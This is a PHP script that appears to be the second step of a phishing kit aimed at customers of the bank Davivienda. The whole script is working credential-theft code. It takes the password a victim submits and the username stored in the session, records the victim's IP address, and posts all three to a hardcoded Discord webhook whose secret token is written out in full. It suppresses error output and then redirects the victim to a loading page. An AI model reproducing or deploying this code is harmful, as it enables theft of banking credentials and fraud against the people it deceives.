<?php
session_start();

@ini_set("display_errors", 0);

// Obtener IP real del usuario
function getRealIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

$myip = getRealIP();
$_SESSION['user_ip'] = $myip;

if (isset($_POST['bg2'])) {
    $clave = $_POST['bg2'];

    // Recuperamos el usuario desde la sesión
    $usuario = $_SESSION['usuario'] ?? 'Desconocido';

    // Webhook de Discord
    $webhookUrl = "https://discord.com/api/webhooks/1548193159836729398/5yGbDhkeCM_KweT4fbCXMKqg6nx_MZoxtXe9WfgAkVeoNz8v-517TZFgoa3g03bp4-7q";

    // Contenido con usuario y clave en bloques de código (triple backtick)
    $content = "✅ **Clave ingresada**\n**Usuario:**\n```\n$usuario\n```\n**Clave:**\n```\n$clave\n```\n**IP:** `$myip`";

    $data = [
        'username' => 'davivienda paso 2',
        'content'  => $content
    ];

    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
            'ignore_errors' => true
        ]
    ];

    $context = stream_context_create($options);
    file_get_contents($webhookUrl, false, $context);

    header('Location: ./loading.php');
    exit();
} else {
    header('Location: ./loading.php');
    exit();
}
?>